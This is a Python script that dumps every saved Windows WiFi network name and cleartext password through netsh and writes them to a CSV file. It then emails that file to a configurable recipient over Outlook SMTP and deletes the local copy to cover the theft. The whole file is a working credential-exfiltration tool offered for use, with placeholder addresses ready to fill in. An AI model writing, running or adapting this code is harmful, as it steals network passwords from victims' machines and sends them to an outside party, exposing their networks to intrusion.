import subprocess  # Importing the subprocess module to run external commands
import csv  # Importing the csv module to work with CSV files
from email.mime.multipart import MIMEMultipart  # Importing MIMEMultipart for creating MIME email messages with attachments
from email.mime.text import MIMEText  # Importing MIMEText for adding text to email messages
from email.mime.base import MIMEBase  # Importing MIMEBase for handling binary attachments
from email import encoders  # Importing encoders for encoding attachment data
import smtplib  # Importing smtplib for sending emails using SMTP
import os  # Importing os module for interacting with the operating system

# Define a function to retrieve WiFi profiles and save them to a CSV file
def get_wifi_profiles(attachment_path):
    # Command to get the names of all WiFi profiles
    profiles_command = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    # Extracting profile names from the command output
    profiles = [line.split(":")[1].strip() for line in profiles_command.stdout.split('\n') if "All User Profile" in line]

    # Gather details for each WiFi profile
    wifi_profiles = []
    for profile in profiles:
        # Command to get details of a specific WiFi profile, including password (key=clear)
        details_command = subprocess.run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], capture_output=True, text=True)
        # Extracting the password (Key Content) from the command output
        password_line = [line.split(":")[1].strip() for line in details_command.stdout.split('\n') if "Key Content" in line]
        password = password_line[0] if password_line else None
        # Storing the profile name and password (if available) in wifi_profiles list
        wifi_profiles.append({'ProfileName': profile, 'Password': password})
    
    # Write WiFi profiles to a CSV file
    with open(attachment_path, 'w', newline='') as file:
        writer = csv.DictWriter(file, fieldnames=['ProfileName', 'Password'])
        writer.writeheader()
        writer.writerows(wifi_profiles)
    
    return wifi_profiles

# Define a function to send an email with a CSV file attachment
def send_email(attachment_path, from_addr, to_addr, password):
    # Email settings
    smtp_server = 'smtp-mail.outlook.com'  # SMTP server for sending the email
    smtp_port = 587  # SMTP port number (587 for TLS encryption)

    subject = "WiFi Profiles"  # Email subject
    body = "Attached are WiFi profiles."  # Email body content

    # Set up the MIME structure for the email
    message = MIMEMultipart()
    message['From'] = from_addr  # Sender's email address
    message['To'] = to_addr  # Recipient's email address
    message['Subject'] = subject  # Email subject
    message.attach(MIMEText(body, 'plain'))  # Adding plain text body to the email

    # Attach the CSV file to the email
    with open(attachment_path, "rb") as attachment_file:
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(attachment_file.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f"attachment; filename={os.path.basename(attachment_path)}")
        message.attach(attachment)

    # Send the email using SMTP
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()  # Start TLS encryption
        server.login(message['From'], password)  # Login to SMTP server using sender's email and password
        text = message.as_string()  # Convert email message to string format
        server.sendmail(message['From'], message['To'], text)  # Send the email

    print("Email sent successfully.")
    os.remove(attachment_path)  # Remove the CSV file after sending the email

# Main script execution starts here
if __name__ == "__main__":
    attachment_path = "wifi_profiles.csv"  # Path to save the WiFi profiles CSV file
    from_email = "your_email@example.com"  # Sender's email address
    to_email = "recipient_email@example.com"  # Recipient's email address
    email_password = os.getenv('EMAIL_PASSWORD')  # Retrieve email password from environment variable

    # Check if email password is available
    if email_password:
        # Retrieve WiFi profiles and save to CSV file
        profiles = get_wifi_profiles(attachment_path)
        if profiles:
            # Send email with CSV file attachment containing WiFi profiles
            send_email(attachment_path, from_email, to_email, email_password)
        else:
            print("No WiFi profiles found.")
    else:
        print("Email password not set.")  # Print message if email password is not available
